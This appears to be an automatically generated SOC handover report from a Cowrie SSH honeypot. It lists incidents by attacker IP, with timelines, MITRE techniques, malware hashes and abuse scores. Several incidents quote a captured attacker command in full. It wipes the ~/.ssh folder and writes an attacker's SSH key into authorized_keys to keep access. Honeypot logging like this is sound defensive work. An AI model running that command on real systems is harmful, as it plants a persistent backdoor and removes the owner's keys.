### 🔴 HIGH · IR-52c2ba082cc7

| Field | Detail |
|---|---|
| **Source IP** | `121.122.65[.]136` |
| **First Seen** | 2026-04-23 13:46 |
| **Last Seen** | 2026-04-23 13:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 13:46:54` | `cowrie.session.connect` |
| `2026-04-23 13:46:54` | `cowrie.client.version` |
| `2026-04-23 13:46:54` | `cowrie.client.kex` |
| `2026-04-23 13:46:55` | `cowrie.login.success` |
| `2026-04-23 13:46:55` | `cowrie.session.params` |
| `2026-04-23 13:46:55` | `cowrie.command.input` |
| `2026-04-23 13:46:55` | `cowrie.command.failed` |
| `2026-04-23 13:46:55` | `cowrie.log.closed` |
| `2026-04-23 13:46:55` | `cowrie.session.params` |
| `2026-04-23 13:46:55` | `cowrie.command.input` |
| `2026-04-23 13:46:55` | `cowrie.session.file_download` |
| `2026-04-23 13:46:55` | `cowrie.log.closed` |
| `2026-04-23 13:46:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.122.65[.]136` to AbuseIPDB if not already reported
- [ ] Block `121.122.65[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87c34ce43db1

| Field | Detail |
|---|---|
| **Source IP** | `121.122.65[.]136` |
| **First Seen** | 2026-04-23 13:46 |
| **Last Seen** | 2026-04-23 13:46 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 13:46:57` | `cowrie.session.connect` |
| `2026-04-23 13:46:57` | `cowrie.client.version` |
| `2026-04-23 13:46:57` | `cowrie.client.kex` |
| `2026-04-23 13:46:57` | `cowrie.login.success` |
| `2026-04-23 13:46:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.122.65[.]136` to AbuseIPDB if not already reported
- [ ] Block `121.122.65[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b4a1ae4b64e

| Field | Detail |
|---|---|
| **Source IP** | `121.122.65[.]136` |
| **First Seen** | 2026-04-23 13:50 |
| **Last Seen** | 2026-04-23 13:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 13:50:02` | `cowrie.session.connect` |
| `2026-04-23 13:50:02` | `cowrie.client.version` |
| `2026-04-23 13:50:02` | `cowrie.client.kex` |
| `2026-04-23 13:50:02` | `cowrie.login.success` |
| `2026-04-23 13:50:02` | `cowrie.session.params` |
| `2026-04-23 13:50:02` | `cowrie.command.input` |
| `2026-04-23 13:50:02` | `cowrie.command.failed` |
| `2026-04-23 13:50:02` | `cowrie.log.closed` |
| `2026-04-23 13:50:02` | `cowrie.session.params` |
| `2026-04-23 13:50:02` | `cowrie.command.input` |
| `2026-04-23 13:50:03` | `cowrie.session.file_download` |
| `2026-04-23 13:50:03` | `cowrie.log.closed` |
| `2026-04-23 13:50:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.122.65[.]136` to AbuseIPDB if not already reported
- [ ] Block `121.122.65[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-111e3496b54c

| Field | Detail |
|---|---|
| **Source IP** | `121.122.65[.]136` |
| **First Seen** | 2026-04-23 13:50 |
| **Last Seen** | 2026-04-23 13:50 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 13:50:04` | `cowrie.session.connect` |
| `2026-04-23 13:50:04` | `cowrie.client.version` |
| `2026-04-23 13:50:04` | `cowrie.client.kex` |
| `2026-04-23 13:50:05` | `cowrie.login.success` |
| `2026-04-23 13:50:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.122.65[.]136` to AbuseIPDB if not already reported
- [ ] Block `121.122.65[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0a0dc9310ad

| Field | Detail |
|---|---|
| **Source IP** | `121.122.65[.]136` |
| **First Seen** | 2026-04-23 13:51 |
| **Last Seen** | 2026-04-23 13:51 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 13:51:02` | `cowrie.session.connect` |
| `2026-04-23 13:51:02` | `cowrie.client.version` |
| `2026-04-23 13:51:02` | `cowrie.client.kex` |
| `2026-04-23 13:51:03` | `cowrie.login.success` |
| `2026-04-23 13:51:03` | `cowrie.session.params` |
| `2026-04-23 13:51:03` | `cowrie.command.input` |
| `2026-04-23 13:51:03` | `cowrie.command.failed` |
| `2026-04-23 13:51:03` | `cowrie.log.closed` |
| `2026-04-23 13:51:03` | `cowrie.session.params` |
| `2026-04-23 13:51:03` | `cowrie.command.input` |
| `2026-04-23 13:51:03` | `cowrie.session.file_download` |
| `2026-04-23 13:51:03` | `cowrie.log.closed` |
| `2026-04-23 13:51:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.122.65[.]136` to AbuseIPDB if not already reported
- [ ] Block `121.122.65[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9237fd78ed70

| Field | Detail |
|---|---|
| **Source IP** | `121.122.65[.]136` |
| **First Seen** | 2026-04-23 13:51 |
| **Last Seen** | 2026-04-23 13:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 13:51:05` | `cowrie.session.connect` |
| `2026-04-23 13:51:05` | `cowrie.client.version` |
| `2026-04-23 13:51:05` | `cowrie.client.kex` |
| `2026-04-23 13:51:05` | `cowrie.login.success` |
| `2026-04-23 13:51:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.122.65[.]136` to AbuseIPDB if not already reported
- [ ] Block `121.122.65[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-731e408d724a

| Field | Detail |
|---|---|
| **Source IP** | `178.217.169[.]240` |
| **First Seen** | 2026-04-23 13:51 |
| **Last Seen** | 2026-04-23 13:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 13:51:46` | `cowrie.session.connect` |
| `2026-04-23 13:51:46` | `cowrie.client.version` |
| `2026-04-23 13:51:46` | `cowrie.client.kex` |
| `2026-04-23 13:51:47` | `cowrie.login.success` |
| `2026-04-23 13:51:47` | `cowrie.session.params` |
| `2026-04-23 13:51:47` | `cowrie.command.input` |
| `2026-04-23 13:51:47` | `cowrie.command.failed` |
| `2026-04-23 13:51:47` | `cowrie.log.closed` |
| `2026-04-23 13:51:48` | `cowrie.session.params` |
| `2026-04-23 13:51:48` | `cowrie.command.input` |
| `2026-04-23 13:51:48` | `cowrie.session.file_download` |
| `2026-04-23 13:51:48` | `cowrie.log.closed` |
| `2026-04-23 13:51:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.217.169[.]240` to AbuseIPDB if not already reported
- [ ] Block `178.217.169[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f95749b26ada

| Field | Detail |
|---|---|
| **Source IP** | `178.217.169[.]240` |
| **First Seen** | 2026-04-23 13:51 |
| **Last Seen** | 2026-04-23 13:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 13:51:51` | `cowrie.session.connect` |
| `2026-04-23 13:51:51` | `cowrie.client.version` |
| `2026-04-23 13:51:51` | `cowrie.client.kex` |
| `2026-04-23 13:51:52` | `cowrie.login.success` |
| `2026-04-23 13:51:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.217.169[.]240` to AbuseIPDB if not already reported
- [ ] Block `178.217.169[.]240` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d69a964099c

| Field | Detail |
|---|---|
| **Source IP** | `121.122.65[.]136` |
| **First Seen** | 2026-04-23 13:52 |
| **Last Seen** | 2026-04-23 13:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 13:52:04` | `cowrie.session.connect` |
| `2026-04-23 13:52:04` | `cowrie.client.version` |
| `2026-04-23 13:52:04` | `cowrie.client.kex` |
| `2026-04-23 13:52:04` | `cowrie.login.success` |
| `2026-04-23 13:52:05` | `cowrie.session.params` |
| `2026-04-23 13:52:05` | `cowrie.command.input` |
| `2026-04-23 13:52:05` | `cowrie.command.failed` |
| `2026-04-23 13:52:05` | `cowrie.log.closed` |
| `2026-04-23 13:52:05` | `cowrie.session.params` |
| `2026-04-23 13:52:05` | `cowrie.command.input` |
| `2026-04-23 13:52:05` | `cowrie.session.file_download` |
| `2026-04-23 13:52:05` | `cowrie.log.closed` |
| `2026-04-23 13:52:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.122.65[.]136` to AbuseIPDB if not already reported
- [ ] Block `121.122.65[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fe53554b467

| Field | Detail |
|---|---|
| **Source IP** | `121.122.65[.]136` |
| **First Seen** | 2026-04-23 13:52 |
| **Last Seen** | 2026-04-23 13:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 13:52:07` | `cowrie.session.connect` |
| `2026-04-23 13:52:07` | `cowrie.client.version` |
| `2026-04-23 13:52:07` | `cowrie.client.kex` |
| `2026-04-23 13:52:07` | `cowrie.login.success` |
| `2026-04-23 13:52:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.122.65[.]136` to AbuseIPDB if not already reported
- [ ] Block `121.122.65[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `34.62.151[.]67` | **32** | 2026-04-23 11:25 | 2026-04-23 11:26 | 4m | 4 | `T1110.001` | 🟠 MEDIUM |
| `34.62.37[.]141` | **32** | 2026-04-23 12:33 | 2026-04-23 12:33 | 3m | 4 | `T1110.001` | 🟠 MEDIUM |
| `69.138.228[.]221` | **26** | 2026-04-23 11:55 | 2026-04-23 12:29 | 0m | 26 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.173.7[.]168` | **25** | 2026-04-23 11:47 | 2026-04-23 11:52 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `206.135.174[.]100` | **25** | 2026-04-23 13:41 | 2026-04-23 13:46 | 5m | 0 | `T1592` | 🟠 MEDIUM |
| `45.158.244[.]111` | **25** | 2026-04-23 11:40 | 2026-04-23 12:04 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `175.107.208[.]132` | **22** | 2026-04-23 12:19 | 2026-04-23 12:27 | 6m | 0 | `T1592` | 🟠 MEDIUM |
| `121.122.65[.]136` | **21** | 2026-04-23 13:09 | 2026-04-23 13:52 | 0m | 21 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `206.168.201[.]163` | **21** | 2026-04-23 12:20 | 2026-04-23 12:25 | 4m | 0 | `T1592` | 🟠 MEDIUM |
| `66.132.172[.]210` | **3** | 2026-04-23 12:49 | 2026-04-23 12:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `74.249.177[.]110` | **2** | 2026-04-23 13:19 | 2026-04-23 13:19 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.183.62[.]1` | 1 | 2026-04-23 13:21 | 2026-04-23 13:21 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `113.137.40[.]250` | 1 | 2026-04-23 11:39 | 2026-04-23 11:39 | 22s | 0 | `T1592` | 🟢 LOW |
| `117.50.51[.]119` | 1 | 2026-04-23 11:28 | 2026-04-23 11:28 | 14s | 0 | `T1592` | 🟢 LOW |
| `120.48.130[.]213` | 1 | 2026-04-23 13:13 | 2026-04-23 13:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.147[.]111` | 1 | 2026-04-23 13:11 | 2026-04-23 13:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.118[.]212` | 1 | 2026-04-23 11:34 | 2026-04-23 11:34 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `157.7.113[.]83` | 1 | 2026-04-23 13:17 | 2026-04-23 13:17 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `171.220.244[.]134` | 1 | 2026-04-23 11:27 | 2026-04-23 11:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `178.217.169[.]240` | 1 | 2026-04-23 13:51 | 2026-04-23 13:51 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `180.76.115[.]202` | 1 | 2026-04-23 11:24 | 2026-04-23 11:26 | 120s | 0 | `T1592` | 🟢 LOW |
| `46.24.47[.]94` | 1 | 2026-04-23 13:12 | 2026-04-23 13:12 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `52.207.126[.]70` | 1 | 2026-04-23 12:56 | 2026-04-23 12:56 | 1s | 0 | `T1592` | 🟢 LOW |
| `59.151.214[.]29` | 1 | 2026-04-23 13:32 | 2026-04-23 13:32 | 13s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `45.158.244[.]111` | UA | UARNet-Eksintech | **100** ⚠️ | 0 |
| `34.62.151[.]67` | BE | Google LLC | **100** ⚠️ | 0 |
| `52.207.126[.]70` | US | Amazon Technologies Inc. | **100** ⚠️ | 27 |
| `59.151.214[.]29` | KR | kt HCN Co.,Ltd. | **100** ⚠️ | 14 |
| `178.217.169[.]240` | KG | KRENA - Kyrgyz research and education network association | **100** ⚠️ | 10 |
| `14.103.118[.]212` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `157.7.113[.]83` | JP | GMO Internet, Inc. | **100** ⚠️ | 37 |
| `120.48.147[.]111` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `121.122.65[.]136` | MY | Maxis Broadband Sdn Bhd | **100** ⚠️ | 3 |
| `113.137.40[.]250` | CN | CHINANET SHAANXI PROVINCE NETWORK | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 142 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 83 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 56 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 28 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 28 |

---

## 🔕 False Positive Summary (25 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 24 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 328 cases |
| Tool 34  | Credential Extractor        | ✅ 141 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 27 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 25 filtered (7.6%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 21 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 56 priority case(s) shown individually · 24 recon entry/entries in table (11 group(s) consolidating 234 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-23T13:54:02Z_
